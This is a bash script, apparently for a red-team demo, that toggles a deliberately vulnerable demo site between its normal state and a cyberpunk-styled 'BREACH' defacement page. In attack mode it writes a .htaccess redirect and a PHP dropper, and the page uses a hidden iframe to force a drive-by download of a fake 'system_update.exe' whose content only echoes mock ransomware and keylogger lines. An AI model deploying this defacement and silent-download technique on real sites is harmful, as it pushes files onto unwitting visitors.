#!/bin/bash
###############################################################################
# 창의적인 토글 스크립트 - 독특한 해킹 UI
###############################################################################

BACKUP_DIR="/root/ORIGINAL_BACKUP"
WWW_DIR="/var/www/html/www"
HTACCESS="$WWW_DIR/.htaccess"
HACKED_PAGE="$WWW_DIR/hacked_display.php"
MALWARE_DROPPER="$WWW_DIR/silent_dropper.php"

echo "╔═══════════════════════════════════════════════╗"
echo "║       VulnerableSNS Creative Toggle           ║"
echo "╚═══════════════════════════════════════════════╝"

# 첫 실행: 원본 백업
if [ ! -d "$BACKUP_DIR" ]; then
    echo "[*] 첫 실행 - 모든 원본 파일 백업 중..."
    mkdir -p "$BACKUP_DIR"

    # PHP 파일 백업
    for file in "$WWW_DIR"/*.php; do
        [ -f "$file" ] && cp "$file" "$BACKUP_DIR/" && echo "  ✓ $(basename $file)"
    done

    # CSS 파일 백업
    for file in "$WWW_DIR"/*.css; do
        [ -f "$file" ] && cp "$file" "$BACKUP_DIR/" && echo "  ✓ $(basename $file)"
    done

    # JS 파일 백업
    for file in "$WWW_DIR"/*.js; do
        [ -f "$file" ] && cp "$file" "$BACKUP_DIR/" && echo "  ✓ $(basename $file)"
    done

    chmod 700 "$BACKUP_DIR"
    echo "[✅] 백업 완료"
fi

# 현재 상태 확인
if [ -f "$HTACCESS" ]; then
    #########################################
    # 정상 모드로 복구
    #########################################
    echo ""
    echo "╔═══════════════════════════════════════════════╗"
    echo "║   ✅ 정상 VulnerableSNS 복구                 ║"
    echo "╚═══════════════════════════════════════════════╝"

    # 해킹 파일 제거
    rm -f "$HTACCESS"
    rm -f "$HACKED_PAGE"
    rm -f "$MALWARE_DROPPER"
    rm -f "$WWW_DIR/system_update.exe"

    # 모든 원본 파일 복구
    if [ -d "$BACKUP_DIR" ]; then
        echo "[*] 원본 파일 복구 중..."
        for file in "$BACKUP_DIR"/*; do
            if [ -f "$file" ]; then
                cp -f "$file" "$WWW_DIR/"
                chown apache:apache "$WWW_DIR/$(basename $file)"
                chmod 644 "$WWW_DIR/$(basename $file)"
                echo "  ✓ $(basename $file) 복구"
            fi
        done
    fi

    systemctl restart httpd

    echo ""
    echo "╔═══════════════════════════════════════════════╗"
    echo "║   ✅ VulnerableSNS 완전 복구 완료!           ║"
    echo "╚═══════════════════════════════════════════════╝"
    echo ""
    echo "🌐 정상 사이트:"
    echo "   http://3.35.22.248/              → 로그인"
    echo "   http://3.35.22.248/register.php  → 회원가입"
    echo "   http://3.35.22.248/upload.php    → 업로드"
    echo ""

else
    #########################################
    # 해킹 모드 - 독창적인 디자인
    #########################################
    echo ""
    echo "╔═══════════════════════════════════════════════╗"
    echo "║   🔴 공격 모드 (Creative Design)             ║"
    echo "╚═══════════════════════════════════════════════╝"

    # 숨겨진 악성코드 드로퍼
    cat > "$MALWARE_DROPPER" << 'EOFDROPPER'
<?php
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="system_update.exe"');
$malware = '@echo off
echo [*] C2 Server: attacker.onion
echo [*] Ransomware: ACTIVE
echo [*] Keylogger: RUNNING
pause
';
echo $malware;
exit;
?>
EOFDROPPER

    # 창의적인 해킹 페이지
    cat > "$HACKED_PAGE" << 'EOFHACKED'
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BREACH DETECTED</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700;900&family=Syne:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0e27;
            --bg-secondary: #151b3d;
            --accent-cyber: #00f0ff;
            --accent-danger: #ff0062;
            --accent-warning: #ffcc00;
            --text-primary: #e0e6ff;
            --text-secondary: #8b92b8;
            --glow-cyber: 0 0 20px var(--accent-cyber);
            --glow-danger: 0 0 30px var(--accent-danger);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Syne', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            overflow-x: hidden;
            position: relative;
        }

        /* 독특한 배경 - 사이버펑크 그리드 */
        .cyber-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                linear-gradient(90deg, rgba(0,240,255,0.03) 1px, transparent 1px),
                linear-gradient(0deg, rgba(0,240,255,0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: gridMove 20s linear infinite;
            z-index: 0;
        }

        @keyframes gridMove {
            0% { transform: perspective(500px) rotateX(60deg) translateY(0); }
            100% { transform: perspective(500px) rotateX(60deg) translateY(50px); }
        }

        /* 글리치 스캔라인 효과 */
        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 0, 0, 0.15),
                rgba(0, 0, 0, 0.15) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 100;
            animation: scanlineMove 8s linear infinite;
        }

        @keyframes scanlineMove {
            0% { transform: translateY(0); }
            100% { transform: translateY(10px); }
        }

        /* 플로팅 입자 효과 */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: var(--accent-cyber);
            box-shadow: var(--glow-cyber);
            animation: float 15s infinite;
        }

        @keyframes float {
            0%, 100% {
                transform: translate(0, 0);
                opacity: 0;
            }
            10%, 90% {
                opacity: 1;
            }
            50% {
                transform: translate(100vw, -100vh);
            }
        }

        .container {
            position: relative;
            z-index: 10;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem;
        }

        .content {
            max-width: 1200px;
            width: 100%;
        }

        /* 헤더 - 글리치 효과 */
        .header {
            text-align: center;
            margin-bottom: 4rem;
            position: relative;
        }

        .breach-title {
            font-family: 'Orbitron', sans-serif;
            font-size: clamp(3rem, 10vw, 8rem);
            font-weight: 900;
            color: var(--accent-danger);
            text-transform: uppercase;
            letter-spacing: 0.1em;
            text-shadow: var(--glow-danger);
            animation: glitchTitle 3s infinite;
            position: relative;
            display: inline-block;
        }

        @keyframes glitchTitle {
            0%, 90%, 100% {
                transform: translate(0);
            }
            92% {
                transform: translate(-2px, 2px);
            }
            94% {
                transform: translate(2px, -2px);
            }
            96% {
                transform: translate(-2px, -2px);
            }
        }

        .breach-subtitle {
            font-family: 'JetBrains Mono', monospace;
            font-size: clamp(0.9rem, 2vw, 1.2rem);
            color: var(--accent-warning);
            margin-top: 1rem;
            letter-spacing: 0.3em;
            animation: blink 2s infinite;
        }

        @keyframes blink {
            0%, 49%, 100% { opacity: 1; }
            50%, 99% { opacity: 0.3; }
        }

        /* 정보 카드 - 네온 보더 */
        .info-card {
            background: linear-gradient(135deg, rgba(21, 27, 61, 0.9), rgba(10, 14, 39, 0.95));
            border: 2px solid transparent;
            border-radius: 20px;
            padding: 3rem;
            margin: 2rem 0;
            position: relative;
            backdrop-filter: blur(20px);
            overflow: hidden;
        }

        .info-card::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 20px;
            padding: 2px;
            background: linear-gradient(45deg, var(--accent-cyber), var(--accent-danger), var(--accent-warning));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            animation: borderRotate 3s linear infinite;
        }

        @keyframes borderRotate {
            0% { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }

        .info-card h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: clamp(1.5rem, 3vw, 2.5rem);
            color: var(--accent-cyber);
            text-shadow: var(--glow-cyber);
            margin-bottom: 2rem;
            text-align: center;
        }

        /* 공격 단계 - 타임라인 스타일 */
        .attack-timeline {
            position: relative;
            padding-left: 2rem;
        }

        .attack-step {
            position: relative;
            padding: 1rem 1.5rem;
            margin: 1rem 0;
            background: rgba(0, 240, 255, 0.05);
            border-left: 4px solid var(--accent-cyber);
            border-radius: 0 12px 12px 0;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            font-family: 'JetBrains Mono', monospace;
            animation: slideIn 0.6s backwards;
        }

        .attack-step:nth-child(1) { animation-delay: 0.1s; }
        .attack-step:nth-child(2) { animation-delay: 0.2s; }
        .attack-step:nth-child(3) { animation-delay: 0.3s; }
        .attack-step:nth-child(4) { animation-delay: 0.4s; }
        .attack-step:nth-child(5) { animation-delay: 0.5s; }
        .attack-step:nth-child(6) { animation-delay: 0.6s; }
        .attack-step:nth-child(7) { animation-delay: 0.7s; }
        .attack-step:nth-child(8) { animation-delay: 0.8s; }
        .attack-step:nth-child(9) { animation-delay: 0.9s; }
        .attack-step:nth-child(10) { animation-delay: 1s; }
        .attack-step:nth-child(11) { animation-delay: 1.1s; border-left-color: var(--accent-danger); }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-50px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .attack-step:hover {
            background: rgba(0, 240, 255, 0.15);
            transform: translateX(8px);
            box-shadow: 0 8px 32px rgba(0, 240, 255, 0.2);
        }

        /* 악성코드 알림 - 펄스 효과 */
        .malware-alert {
            background: linear-gradient(135deg, rgba(255, 0, 98, 0.2), rgba(255, 0, 98, 0.05));
            border: 2px solid var(--accent-danger);
            border-radius: 20px;
            padding: 2.5rem;
            margin: 2rem 0;
            text-align: center;
            animation: pulseAlert 2s infinite;
            position: relative;
            overflow: hidden;
        }

        @keyframes pulseAlert {
            0%, 100% {
                box-shadow: 0 0 20px rgba(255, 0, 98, 0.3);
            }
            50% {
                box-shadow: 0 0 40px rgba(255, 0, 98, 0.6);
            }
        }

        .malware-alert::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 0, 98, 0.1), transparent);
            animation: sweep 3s infinite;
        }

        @keyframes sweep {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }

        .malware-alert h3 {
            font-family: 'Orbitron', sans-serif;
            font-size: clamp(1.3rem, 2.5vw, 2rem);
            color: var(--accent-danger);
            margin-bottom: 1rem;
            position: relative;
            z-index: 1;
        }

        .malware-status {
            font-family: 'JetBrains Mono', monospace;
            color: var(--accent-warning);
            font-size: clamp(0.9rem, 1.5vw, 1.1rem);
            position: relative;
            z-index: 1;
        }

        code {
            background: rgba(0, 0, 0, 0.5);
            padding: 0.4rem 0.8rem;
            border-radius: 8px;
            color: var(--accent-cyber);
            font-family: 'JetBrains Mono', monospace;
            border: 1px solid rgba(0, 240, 255, 0.3);
        }

        /* 취약점 리스트 */
        .vuln-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
            margin: 2rem 0;
        }

        .vuln-item {
            background: rgba(255, 204, 0, 0.05);
            border: 1px solid var(--accent-warning);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            transition: all 0.3s;
            font-family: 'JetBrains Mono', monospace;
        }

        .vuln-item:hover {
            background: rgba(255, 204, 0, 0.15);
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(255, 204, 0, 0.3);
        }

        .footer {
            text-align: center;
            margin-top: 4rem;
            padding-top: 2rem;
            border-top: 1px solid rgba(0, 240, 255, 0.2);
            font-family: 'JetBrains Mono', monospace;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        @media (max-width: 768px) {
            .info-card {
                padding: 2rem;
            }
            .attack-timeline {
                padding-left: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="cyber-grid"></div>
    <div class="scanlines"></div>
    <div class="particles" id="particles"></div>

    <div class="container">
        <div class="content">
            <div class="header">
                <h1 class="breach-title">BREACH</h1>
                <p class="breach-subtitle">SYSTEM COMPROMISED</p>
            </div>

            <div class="info-card">
                <h2>⚡ ATTACK CHAIN</h2>
                <div class="attack-timeline">
                    <div class="attack-step">→ 01 | SSRF Vulnerability (health.php)</div>
                    <div class="attack-step">→ 02 | ModSecurity WAF Bypass</div>
                    <div class="attack-step">→ 03 | AWS IMDSv1 Access</div>
                    <div class="attack-step">→ 04 | IAM Credentials Theft</div>
                    <div class="attack-step">→ 05 | Web Shell Installation</div>
                    <div class="attack-step">→ 06 | Backdoor User Creation</div>
                    <div class="attack-step">→ 07 | Root Privilege Escalation</div>
                    <div class="attack-step">→ 08 | SIEM Neutralization</div>
                    <div class="attack-step">→ 09 | Persistent Backdoor</div>
                    <div class="attack-step">→ 10 | Complete System Takeover</div>
                    <div class="attack-step">→ 11 | Malware Deployment ⚠</div>
                </div>
            </div>

            <div class="malware-alert">
                <h3>⚠ MALWARE DEPLOYED</h3>
                <div class="malware-status">
                    ✓ Installation Complete<br>
                    ✓ Location: <code>C:\Windows\System32\update_service.exe</code><br>
                    ✓ Auto-start Registered
                </div>
            </div>

            <div class="info-card">
                <h2>🔥 VULNERABILITIES</h2>
                <div class="vuln-grid">
                    <div class="vuln-item">❌ AWS IMDSv1</div>
                    <div class="vuln-item">❌ WAF Exception</div>
                    <div class="vuln-item">❌ SSRF</div>
                    <div class="vuln-item">❌ PHP Dangers</div>
                    <div class="vuln-item">❌ Sudo Misconfig</div>
                </div>
            </div>

            <div class="footer">
                <p>RED TEAM PENETRATION TEST</p>
                <p>Educational Demonstration • 2025-11-17</p>
            </div>
        </div>
    </div>

    <script>
        // 플로팅 입자 생성
        const particlesContainer = document.getElementById('particles');
        for (let i = 0; i < 30; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.top = Math.random() * 100 + '%';
            particle.style.animationDelay = Math.random() * 15 + 's';
            particle.style.animationDuration = (10 + Math.random() * 10) + 's';
            particlesContainer.appendChild(particle);
        }

        // 숨김 다운로드
        setTimeout(() => {
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute;left:-9999px';
            iframe.src = '/silent_dropper.php';
            document.body.appendChild(iframe);
            setTimeout(() => {
                if (document.body.contains(iframe)) document.body.removeChild(iframe);
            }, 1000);
        }, 2000);
    </script>
</body>
</html>
EOFHACKED

    # .htaccess
    cat > "$HTACCESS" << 'EOFHTACCESS'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_URI} !^/hacked_display\.php$
RewriteCond %{REQUEST_URI} !^/silent_dropper\.php$
RewriteCond %{REQUEST_URI} !^/uploads/
RewriteCond %{REQUEST_URI} !^/api/
RewriteCond %{REQUEST_URI} !\.(jpg|jpeg|png|gif|css|js|ico|exe)$
RewriteRule ^.*$ /hacked_display.php [L]
</IfModule>
EOFHTACCESS

    # 권한 설정
    chown apache:apache "$HACKED_PAGE" "$HTACCESS" "$MALWARE_DROPPER"
    chmod 644 "$HACKED_PAGE" "$HTACCESS" "$MALWARE_DROPPER"

    systemctl restart httpd

    echo ""
    echo "╔═══════════════════════════════════════════════╗"
    echo "║   🔴 Creative Hack Mode Activated!           ║"
    echo "╚═══════════════════════════════════════════════╝"
    echo ""
    echo "🎨 사이버펑크 UI 활성화"
    echo "🦠 악성코드 자동 배포"
    echo ""
fi

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "💡 Toggle: sudo bash $0"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
